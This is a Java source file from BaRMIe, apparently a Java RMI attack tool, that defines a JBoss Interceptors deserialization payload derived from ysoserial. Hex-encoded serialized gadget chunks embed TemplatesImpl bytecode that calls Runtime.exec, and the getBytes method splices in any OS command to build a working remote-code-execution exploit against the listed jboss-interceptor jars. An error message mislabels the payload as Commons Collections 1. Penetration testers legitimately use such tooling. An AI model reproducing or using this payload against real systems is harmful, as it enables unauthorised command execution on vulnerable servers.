package nb.barmie.modes.attack.deser.payloads;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import nb.barmie.exceptions.BaRMIeDeserPayloadGenerationException;
import nb.barmie.exceptions.BaRMIeException;
import nb.barmie.modes.attack.DeserPayload;

/***********************************************************
 * Deserialization payload for JBoss Interceptors API.
 * 
 * Based on the ysoserial and the excellent work of Chris
 * Frohoff, Matthias Kaiser et al
 * (https://github.com/frohoff/ysoserial).
 * 
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class JBossInterceptorsPayload1 extends DeserPayload {
	/*******************
	 * Properties
	 ******************/
	//Payload data chunks
	private final String _header_chunk = "737200346f72672e6a626f73732e696e746572636570746f722e70726f78792e496e746572636570746f724d6574686f6448616e646c6572873a4af771c283ca0300054c0011696e74657263657074696f6e4d6f64656c7400334c6f72672f6a626f73732f696e746572636570746f722f7370692f6d6f64656c2f496e74657263657074696f6e4d6f64656c3b4c001b696e746572636570746f7248616e646c6572496e7374616e63657374000f4c6a6176612f7574696c2f4d61703b4c0018696e766f636174696f6e436f6e74657874466163746f727974003c4c6f72672f6a626f73732f696e746572636570746f722f7370692f636f6e746578742f496e766f636174696f6e436f6e74657874466163746f72793b4c001e746172676574436c617373496e746572636570746f724d657461646174617400384c6f72672f6a626f73732f696e746572636570746f722f7370692f6d657461646174612f496e746572636570746f724d657461646174613b4c000e746172676574496e7374616e63657400124c6a6176612f6c616e672f4f626a6563743b707870737200336f72672e6a626f73732e696e746572636570746f722e6275696c6465722e496e74657263657074696f6e4d6f64656c496d706cd494e150e2b8db200200054c000f616c6c496e746572636570746f727374000f4c6a6176612f7574696c2f5365743b4c0012676c6f62616c496e746572636570746f727371007e00024c0011696e746572636570746564456e7469747971007e00054c00176d6574686f64426f756e64496e746572636570746f727371007e00024c00166d6574686f647349676e6f72696e67476c6f62616c7371007e0008707870737200176a6176612e7574696c2e4c696e6b656448617368536574d86cd75a95dd2a1e02000070787200116a6176612e7574696c2e48617368536574ba44859596b8b734030000707870770c000000000010000000000000737200366f72672e6a626f73732e696e746572636570746f722e7265616465722e53696d706c65496e746572636570746f724d6574616461746100046e2632cdf08b0200035a000b746172676574436c6173734c0014696e746572636570746f724d6574686f644d617071007e00024c0014696e746572636570746f725265666572656e63657400394c6f72672f6a626f73732f696e746572636570746f722f7370692f6d657461646174612f496e746572636570746f725265666572656e63653b70787000737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c647078700000000100000000770800000000000000017e7200306f72672e6a626f73732e696e746572636570746f722e7370692e6d6f64656c2e496e74657263657074696f6e547970650000000000000000120000707872000e6a6176612e6c616e672e456e756d000000000000000012000070787074000d504f53545f4143544956415445737200136a6176612e7574696c2e41727261794c6973747881d21d99c7619d03000149000473697a65707870000000017704000000007372005a6f72672e6a626f73732e696e746572636570746f722e7265616465722e44656661756c744d6574686f644d657461646174612444656661756c744d6574686f644d6574616461746153657269616c697a6174696f6e50726f7879d579494f9b7dd2ca0200024c000f6d6574686f645265666572656e636574002f4c6f72672f6a626f73732f696e746572636570746f722f6275696c6465722f4d6574686f645265666572656e63653b4c001a737570706f72746564496e74657263657074696f6e547970657371007e00087078707372004c6f72672e6a626f73732e696e746572636570746f722e6275696c6465722e4d6574686f645265666572656e6365244d6574686f64486f6c64657253657269616c697a6174696f6e50726f7879d46a60f4493e7dd20200034c0009636c6173734e616d657400124c6a6176612f6c616e672f537472696e673b4c000a6d6574686f644e616d6571007e001c5b0013706172616d65746572436c6173734e616d65737400135b4c6a6176612f6c616e672f537472696e673b70787074003a636f6d2e73756e2e6f72672e6170616368652e78616c616e2e696e7465726e616c2e78736c74632e747261782e54656d706c61746573496d706c74000e6e65775472616e73666f726d6572757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b47020000707870000000007371007e000b770c00000000001000000000000171007e00147878787372003e6f72672e6a626f73732e696e746572636570746f722e7265616465722e436c6173734d65746164617461496e746572636570746f725265666572656e6365cb83b3bef93b30fe0200014c000d636c6173734d657461646174617400324c6f72672f6a626f73732f696e746572636570746f722f7370692f6d657461646174612f436c6173734d657461646174613b707870737200346f72672e6a626f73732e696e746572636570746f722e7265616465722e5265666c656374697665436c6173734d65746164617461e303853ff76c4ebe0200014c0005636c617a7a7400114c6a6176612f6c616e672f436c6173733b7078707671007e0010787371007e00100000000100000000770800000000000000067e71007e001274000b5052455f44455354524f597371007e00160000000077040000000171007e000f787e71007e001274000d41524f554e445f494e564f4b457371007e00160000000177040000000171007e000f787e71007e001274000d5052455f5041535349564154457371007e00160000000177040000000171007e000f7871007e00147371007e00160000000177040000000171007e000f787e71007e001274000e504f53545f434f4e5354525543547371007e00160000000177040000000171007e000f787e71007e001274000e41524f554e445f54494d454f55547371007e00160000000177040000000171007e000f787871007e002a7371007e0010000000010000000077080000001000000000787371007e000b770c000000103f40000000000000787371007e00103f4000000000000c7708000000100000000171007e000f7372003a636f6d2e73756e2e6f72672e6170616368652e78616c616e2e696e7465726e616c2e78736c74632e747261782e54656d706c61746573496d706c09574fc16eacab3303000649000d5f696e64656e744e756d62657249000e5f7472616e736c6574496e6465785b000a5f62797465636f6465737400035b5b425b00065f636c6173737400125b4c6a6176612f6c616e672f436c6173733b4c00055f6e616d6571007e001c4c00115f6f757470757450726f706572746965737400164c6a6176612f7574696c2f50726f706572746965733b70787000000000ffffffff757200035b5b424bfd19156767db3702000070787000000002757200025b42acf317f8060854e0020000707870";
	private final String _mid_chunk = "cafebabe0000003100380a00030022070036070025070026010001410100014a010001410500000000000000000100063c696e69743e010003282956010004436f646501000141010001410100014101000141010001410100014101000141010005284c3b29560100014101000141010001410100014101000141070027010006284c413b29560100014101000141010001410100014101000141010001410c000a000b07002801000141010040636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f72756e74696d652f41627374726163745472616e736c65740100146a6176612f696f2f53657269616c697a61626c6501000141010001410100083c636c696e69743e0100116a6176612f6c616e672f52756e74696d6507002a01000a67657452756e74696d6501001528294c6a6176612f6c616e672f52756e74696d653b0c002c002d0a002b002e01";
	private final String _footer_chunk = "08003001000465786563010027284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b0c003200330a002b00340100014101000141002100020003000100040001001a000500060001000700000002000800040001000a000b0001000c0000002f00010001000000052ab70001b100000002000d0000000600010000002e000e0000000c000100000005000f003700000001001300140002000c0000003f0000000300000001b100000002000d00000006000100000033000e00000020000300000001000f0037000000000001001500160001000000010017001800020019000000040001001a00010013001b0002000c000000490000000400000001b100000002000d00000006000100000037000e0000002a000400000001000f003700000000000100150016000100000001001c001d000200000001001e001f00030019000000040001001a00080029000b0001000c0000001b000300020000000fa70003014cb8002f1231b6003557b1000000000002002000000002002100110000000a000100020023001000097571007e004600000113cafebabe00000031001b0a00030015070017070018070019010001410100014a010001410500000000000000000100063c696e69743e010003282956010004436f646501000141010001410100014101000141010001410100014101000141010001410c000a000b07001a01000241410100106a6176612f6c616e672f4f626a6563740100146a6176612f696f2f53657269616c697a61626c6501000141002100020003000100040001001a000500060001000700000002000800010001000a000b0001000c0000002f00010001000000052ab70001b100000002000d0000000600010000003b000e0000000c000100000005000f001200000002001300000002001400110000000a0001000200160010000970740001417077010078787372003b6f72672e6a626f73732e696e746572636570746f722e70726f78792e44656661756c74496e766f636174696f6e436f6e74657874466163746f7279414e96f669775a610200007078707371007e000d007371007e0010000000010000000077080000001000000000787371007e002471007e00297371007e00100000000100000000770800000010000000017400014171007e00507878";
	
	/*******************
	 * Set payload properties
	 ******************/
	public JBossInterceptorsPayload1() {
		super();
		this.setName("JBossInterceptors1");
		this.setDescription("JBoss Interceptors API");
		this.setRemediationAdvice("[JBoss] " + this.REMEDIATION_NO_FIX);
		this.setAffectedJars(new String[] {
			"jboss-interceptor-api-1.0.1-CR1.jar", "jboss-interceptor-api-1.0.jar", "jboss-interceptor-api-1.1-CR1.jar", "jboss-interceptor-api-1.1.jar", "jboss-interceptor-api-3.1.0-CR1.jar",
			"jboss-interceptor-api-3.1.0-CR2.jar", "jboss-interceptor-api-3.1.0-CR3.jar", "jboss-interceptor-core-2.0.0.Alpha1.jar", "jboss-interceptor-core-2.0.0.Alpha2.jar", "jboss-interceptor-core-2.0.0.Alpha3.jar",
			"jboss-interceptor-core-2.0.0.CR1.jar", "jboss-interceptor-core-2.0.0.Final.jar", "jboss-interceptor-spi-2.0.0.Alpha1.jar", "jboss-interceptor-spi-2.0.0.Alpha2.jar", "jboss-interceptor-spi-2.0.0.Alpha3.jar",
			"jboss-interceptor-spi-2.0.0.CR1.jar", "jboss-interceptor-spi-2.0.0.Final-redhat-1.jar", "jboss-interceptor-spi-2.0.0.Final.jar"
		});
	}
	
	/*******************
	 * Generate payload bytes for the given OS command, correcting references
	 * by the given amount.
	 * 
	 * @param cmd The operating system command to execute.
	 * @param refCorrection The amount to correct TC_REFERENCE handles by (see note above).
	 * @return An array of bytes making up the deserialization payload.
	 ******************/
	public byte[] getBytes(String cmd, int refCorrection) throws BaRMIeException {
		ByteArrayOutputStream out;
		
		//Generate the payload bytes
		try {
			//Fix references in the header bytes and add them to the output
			out = new ByteArrayOutputStream();
			out.write(this.fixReferences(this.hexStrToByteArray(this._header_chunk), refCorrection));
			
			//Add the middle chunk
			out.write(this.intToByteArray(765 + cmd.length()));
			out.write(this.hexStrToByteArray(this._mid_chunk));
			
			//Add the command string to the output
			out.write(this.stringToUtf8ByteArray(cmd));
			
			//Fix references in the footer bytes and add them to the output
			out.write(this.fixReferences(this.hexStrToByteArray(this._footer_chunk), refCorrection));
		} catch(IOException ioe) {
			throw new BaRMIeDeserPayloadGenerationException("Failed to build Commons Collections 1 deserialization payload.", ioe);
		}
		
		//Return the payload bytes
		return out.toByteArray();
	}
}